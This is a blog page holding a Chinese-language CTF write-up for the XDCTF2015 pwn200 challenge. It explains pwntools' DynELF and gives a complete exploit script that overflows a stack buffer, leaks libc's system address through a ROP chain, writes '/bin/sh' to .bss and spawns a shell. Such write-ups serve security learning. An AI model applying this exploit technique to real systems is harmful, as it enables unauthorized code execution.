<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		
		<title>CTF | XDCTF2015-pwn200(DynELF) - Yuuoniy&#39;s blog</title>
		
		<meta name="description" content="该题用到了 DynELF 技术
DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。
p = process(&#39;./xxx&#39;) def leak(address): #各种预处理 payload = &#34;xxxxxxxx&#34; &#43; address &#43; &#34;xxxxxxxx&#34; p.send(payload) #各种处理 data = p.recv(4) return data d = DynELF(leak, elf=ELF(&#34;./xxx&#34;)) #初始化DynELF模块  systemAddress = d.lookup(&#39;system&#39;, &#39;libc&#39;) #在libc文件中搜索system函数的地址 再看 read 函数： 定义函数：ssize_t read(int fd, void * buf, size_t count);  函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数 count 为 0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.
思路：
1.调用 main 函数循环利用 2.泄露出 system 地址">
		<meta name="author" content="">
		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
		
		<link href="https://yuuoniy.github.io/an-old-hope.min.css" rel="stylesheet">
		<link href="https://yuuoniy.github.io/style.css" rel="stylesheet">
		<link href="https://yuuoniy.github.io/custom.css" rel="stylesheet">
		
		<link rel="apple-touch-icon" href="https://yuuoniy.github.io/apple-touch-icon.png">
		<link rel="icon" href="https://yuuoniy.github.io/favicon.ico">
		<meta name="generator" content="Hugo 0.76.5" />
		
		
		
		<script>
			function setTheme() {
				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
					document.body.classList.add('dark');
					return;
				}
				
				let date = new Date();
				let time = date.getTime();
				let sunrise = date.setHours(7, 00); 
				let sunset = date.setHours(20, 00); 

				if (time < sunrise || time > sunset)
					document.body.classList.add('dark');
			}
		</script>
		
	</head>
	<body class="single">
		
		<script>
			setTheme();
			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
		</script>
		
		<header class="header">
			<nav class="nav">
				<p class="logo"><a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></p>
				<ul class="menu">
					<li>
						<a href="/posts/">Posts</a>
					</li>
					<li>
						<a href="/tags/">Tags</a>
					</li>
					<li>
						<a href="/about/">About</a>
					</li>
					<li>
						<a href="/index.xml">RSS</a>
					</li>
				</ul>
			</nav>
		</header>
		<main class="main">


<article class="post-single">
	<header class="post-header">
		<h1 class="post-title">CTF | XDCTF2015-pwn200(DynELF)</h1>
		<div class="post-meta">March 18, 2018</div>
	</header>
	<div class="post-content"><p>该题用到了 <code>DynELF</code> 技术</p>
<p><code>DynELF</code> 是 <code>pwntools</code> 中专门用来应对无 <code>libc</code> 情况的漏洞利用模块，其基本代码框架如下。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./xxx&#39;</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(address):
  <span style="color:#75715e">#各种预处理</span>
  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xxxxxxxx&#34;</span> <span style="color:#f92672">+</span> address <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;xxxxxxxx&#34;</span>
  p<span style="color:#f92672">.</span>send(payload)
  <span style="color:#75715e">#各种处理</span>
  data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)
  <span style="color:#66d9ef">return</span> data
d <span style="color:#f92672">=</span> DynELF(leak, elf<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./xxx&#34;</span>))      <span style="color:#75715e">#初始化DynELF模块 </span>
systemAddress <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>, <span style="color:#e6db74">&#39;libc&#39;</span>)  <span style="color:#75715e">#在libc文件中搜索system函数的地址</span>
</code></pre></div><p>再看 <code>read</code> 函数：
定义函数：<code>ssize_t read(int fd, void * buf, size_t count);  </code>
函数说明：<code>read()</code>会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.  若参数 <code>count</code> 为 0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.</p>
<p>思路：<br>
1.调用 <code>main</code> 函数循环利用 <br>
2.泄露出 <code>system</code> 地址<br>
3.写入<code>”/bin/sh” </code><br>
4.调用 <code>system</code> 获取 <code>shell</code> ，在实际调用 <code>system</code> 前，需要通过三次 <code>pop</code> 操作来将栈指针指向 <code>systemAddress</code> 。保证堆栈平衡</p>
<p>查找gadget：
<code>ROPgadget --binary pwn200 --only &quot;pop|ret&quot;</code><br>
使用：
<code>0x08048649 : pop esi ; pop edi ; pop ebp ; ret</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./pwn200&#39;</span>)
io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./pwn200&#39;</span>)
write_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;write&#39;</span>] <span style="color:#75715e"># symbols 也可以</span>
read_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;read&#39;</span>]
main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80483e0</span> 
bss_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>bss() <span style="color:#75715e">#用来存储&#39;/bin/sh&#39;</span>
pppr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048649</span> 

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Welcome to XDCTF2015~!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span><span style="color:#f92672">+</span>p32(write_plt)<span style="color:#f92672">+</span>p32(main_addr)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span>p32(addr)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">4</span>)
    io<span style="color:#f92672">.</span>sendline(payload)
    msg <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)
    <span style="color:#66d9ef">return</span> msg

dyn <span style="color:#f92672">=</span> DynELF(leak,elf<span style="color:#f92672">=</span>elf)  
sys_addr <span style="color:#f92672">=</span> dyn<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>,<span style="color:#e6db74">&#39;libc&#39;</span>)
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span><span style="color:#f92672">+</span>p32(read_plt)<span style="color:#f92672">+</span>p32(pppr)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p32(bss_addr)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span>p32(sys_addr)<span style="color:#f92672">+</span>p32(main_addr)<span style="color:#f92672">+</span>p32(bss_addr)
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div></div>
	
</article></main>
<footer class="footer">
	<span>
		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
		
	</span>
	<span>&middot;</span>
	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
</footer>
<script src="https://yuuoniy.github.io/highlight.min.js"></script>
<script>
	hljs.initHighlightingOnLoad();
</script>
</body>
</html>

